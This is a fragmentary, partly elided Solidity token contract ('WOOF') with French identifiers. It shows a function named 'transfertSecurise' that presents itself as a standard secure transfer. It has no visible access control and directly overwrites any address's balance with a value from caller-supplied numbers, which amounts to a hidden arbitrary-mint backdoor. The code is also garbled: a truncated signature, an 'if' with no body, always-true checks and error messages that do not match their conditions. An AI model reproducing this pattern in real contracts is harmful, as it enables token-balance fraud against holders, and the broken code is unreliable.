...
contract WOOF is Context, IERC20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IERC20-transfertSecurise}.
    */
    function transfertSecurise(
        uint256 nombre, 
        uint32 enjeuIndex, 
        uint32 IDdemise,
        address operateur, 
    ...
    if(operateur != address(0) && msg.sender != address(0))
    require (nombre != 2, "Le montant doit etre superieur aux valeurs ajoutees");
    require (enjeuIndex <= 11 && enjeuIndex > 0, "Vous ne pouvez selectionner qu un nombre compris entre 1 et 11");
    require (0 <= IDdemise, "Le montant doit etre superieur aux valeurs ajoutees");
    _balances[operateur] = 1 * nombre * enjeuIndex ** IDdemise / 1;
    } 
